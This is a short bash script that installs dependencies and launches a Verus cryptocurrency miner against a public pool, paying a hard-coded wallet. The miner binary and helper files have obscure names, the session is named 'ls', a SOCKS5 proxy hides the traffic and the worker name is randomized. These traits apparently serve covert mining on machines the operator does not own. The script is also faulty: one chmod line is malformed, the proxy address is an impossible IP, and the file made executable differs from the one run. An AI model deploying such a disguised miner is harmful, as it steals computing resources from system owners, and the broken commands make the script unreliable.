#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x jured.sh && chmod +x cumin chmod 777 cumin jured.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
WORKER=$(echo $(shuf -i 1-10 -n 1)SHARK-01)
PROXY=socks5://772.206.181.105:64935	
./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
